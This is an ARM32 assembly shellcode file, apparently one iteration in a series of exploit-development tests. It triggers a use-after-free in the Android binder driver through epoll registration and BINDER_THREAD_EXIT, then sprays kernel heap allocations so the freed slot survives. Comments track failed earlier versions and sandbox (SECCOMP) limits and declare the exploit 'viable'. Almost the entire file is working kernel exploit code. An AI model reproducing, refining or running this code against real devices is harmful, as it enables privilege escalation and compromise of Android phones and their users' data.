/*
 * uaf_trigger_test_d.s — UAF trigger with spray, NO BC_ENTER_LOOPER
 * ARM32 EABI shellcode
 *
 * v17: crashed — close(epoll_fd) on freed binder_thread (spinlock deadlock)
 * v17b: BINDER_THREAD_EXIT confirmed SECCOMP-allowed (0xBB00)
 * v17c: BC_ENTER_LOOPER failed (BINDER_WRITE_READ compat issue?)
 *
 * Key insight: BC_ENTER_LOOPER is NOT needed for the UAF!
 * epoll_ctl(ADD, binder_fd) calls binder_poll() → poll_wait(&thread->wait)
 * This registers the wait_queue with epoll REGARDLESS of looper state.
 * BINDER_THREAD_EXIT frees the thread, close(epoll_fd) triggers UAF.
 *
 * Removing BINDER_WRITE_READ eliminates the compat ioctl issue entirely.
 *
 * Sequence:
 *   A1: openat("/dev/binder", O_RDWR) → binder_fd
 *   A2: ioctl(BINDER_SET_MAX_THREADS, &0)
 *   A3: epoll_create1(0) → epoll_fd
 *   A4: epoll_ctl(ADD, binder_fd, {EPOLLIN}) — registers wait_queue
 *   B1: BINDER_THREAD_EXIT — FREE binder_thread (kmalloc-512)
 *   B2: Spray 4× open(/dev/binder) + ioctl → kzalloc(408) → zeros spinlock
 *   B3: close(epoll_fd) — UAF trigger
 *   B4: nanosleep + cleanup
 *
 * Expected:
 *   0xBB00 = UAF SURVIVED with spray! Exploit is viable!
 *   0xA1xx = openat failed
 *   0xA2xx = BINDER_SET_MAX_THREADS failed
 *   0xA3xx = epoll_create1 failed
 *   0xA4xx = epoll_ctl failed
 *   Device reboot = spray didn't help (need different approach)
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

.equ BINDER_SET_MAX_THREADS, 0x40046205
.equ BINDER_THREAD_EXIT,     0x40046208
.equ EPOLL_CTL_ADD,          1
.equ EPOLLIN,                0x001
.equ O_RDWR,                 2

/* Stack layout (32 bytes = 0x20):
 * SP+0x00: max_threads (4)
 * SP+0x04: epoll_event (12 bytes, SP+0x04 to SP+0x0F)
 * SP+0x10: timespec (8 bytes, SP+0x10 to SP+0x17)
 * SP+0x18: padding
 */
.equ FRAME, 32

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME

    /* ═══ PHASE A: Binder + epoll setup (NO BC_ENTER_LOOPER) ═══ */

    /* A1: openat("/dev/binder", O_RDWR) */
    mvn     r0, #99             /* AT_FDCWD = -100 */
    adr     r1, str_binder
    mov     r2, #O_RDWR
    mov     r3, #0
    mov     r7, #320
    add     r7, r7, #2          /* 322 = __NR_openat */
    svc     #0
    cmp     r0, #0
    bmi     fail_a1
    mov     r4, r0              /* R4 = binder_fd */

    /* A2: ioctl(binder_fd, BINDER_SET_MAX_THREADS, &0) */
    mov     r0, r4
    ldr     r1, const_smt
    mov     r3, #0
    str     r3, [sp, #0]
    add     r2, sp, #0
    mov     r7, #54             /* __NR_ioctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a2

    /* A3: epoll_create1(0) */
    mov     r0, #0
    mov     r7, #352
    add     r7, r7, #5          /* 357 = __NR_epoll_create1 */
    svc     #0
    cmp     r0, #0
    bmi     fail_a3
    mov     r8, r0              /* R8 = epoll_fd */

    /* A4: epoll_ctl(epoll_fd, ADD, binder_fd, {EPOLLIN})
     * This calls binder_poll → poll_wait(&thread->wait, ...)
     * which registers the wait_queue with epoll.
     * NO BC_ENTER_LOOPER needed — epoll does it during ADD. */
    mov     r3, #EPOLLIN
    str     r3, [sp, #0x04]
    str     r4, [sp, #0x08]
    mov     r3, #0
    str     r3, [sp, #0x0C]
    mov     r0, r8
    mov     r1, #EPOLL_CTL_ADD
    mov     r2, r4
    add     r3, sp, #0x04
    mov     r7, #248
    add     r7, r7, #3          /* 251 = __NR_epoll_ctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a4

    /* ═══ PHASE B: UAF with kzalloc spray ═══ */

    /* B1: BINDER_THREAD_EXIT — FREE binder_thread (kmalloc-512) */
    mov     r0, r4
    ldr     r1, const_bte
    mov     r2, #0
    mov     r7, #54
    svc     #0
    /* binder_thread is now on kmalloc-512 freelist */

    /* B2: Spray — 4× open(/dev/binder) + ioctl each → kzalloc(408)
     * kzalloc zeros the freed slot → spinlock at WAITQUEUE_OFFSET = 0
     * spin_lock_irqsave will succeed immediately on zeroed lock */
    mov     r9, #4              /* spray count */
spray_loop:
    mvn     r0, #99             /* AT_FDCWD */
    adr     r1, str_binder
    mov     r2, #O_RDWR
    mov     r3, #0
    mov     r7, #320
    add     r7, r7, #2          /* openat */
    svc     #0
    cmp     r0, #0
    bmi     spray_next          /* skip if open failed */
    /* R0 = spray_fd, use directly for ioctl */
    ldr     r1, const_smt       /* BINDER_SET_MAX_THREADS */
    mov     r3, #0
    str     r3, [sp, #0]
    add     r2, sp, #0
    mov     r7, #54
    svc     #0
    /* Don't check return — kzalloc already happened in binder_get_thread */
spray_next:
    subs    r9, r9, #1
    bgt     spray_loop

    /* B3: close(epoll_fd) — TRIGGER UAF!
     * The freed binder_thread slot should now contain zeroed data
     * from our kzalloc spray. The spinlock at WAITQUEUE_OFFSET is 0.
     * spin_lock_irqsave → succeeds immediately.
     * list_del writes self-pointing pointers → harmless. */
    mov     r0, r8              /* epoll_fd */
    mov     r7, #6              /* __NR_close */
    svc     #0

    /* B4: nanosleep(50ms) — let kernel settle */
    mov     r3, #0
    str     r3, [sp, #0x10]     /* tv_sec = 0 */
    ldr     r3, const_50ms
    str     r3, [sp, #0x14]     /* tv_nsec */
    add     r0, sp, #0x10
    mov     r1, #0
    mov     r7, #162            /* __NR_nanosleep */
    svc     #0

    /* Cleanup: close binder_fd (spray fds are leaked — harmless) */
    mov     r0, r4
    mov     r7, #6
    svc     #0

    /* ═══ SURVIVED! UAF trigger with spray works! ═══ */
    mov     r0, #0xBB00
    b       done

    /* ── Error handlers ── */
fail_a1:
    rsb     r0, r0, #0
    mov     r1, #0xA100
    orr     r0, r0, r1
    b       done
fail_a2:
    rsb     r0, r0, #0
    mov     r1, #0xA200
    orr     r0, r0, r1
    b       done
fail_a3:
    rsb     r0, r0, #0
    mov     r1, #0xA300
    orr     r0, r0, r1
    b       done
fail_a4:
    rsb     r0, r0, #0
    mov     r1, #0xA400
    orr     r0, r0, r1
    b       done

done:
    add     sp, sp, #FRAME
    pop     {r4-r11, pc}

    /* ── Data pool ── */
    .align 2
const_smt:
    .word   0x40046205          /* BINDER_SET_MAX_THREADS */
const_bte:
    .word   0x40046208          /* BINDER_THREAD_EXIT */
const_50ms:
    .word   50000000
str_binder:
    .asciz  "/dev/binder"
    .align  2
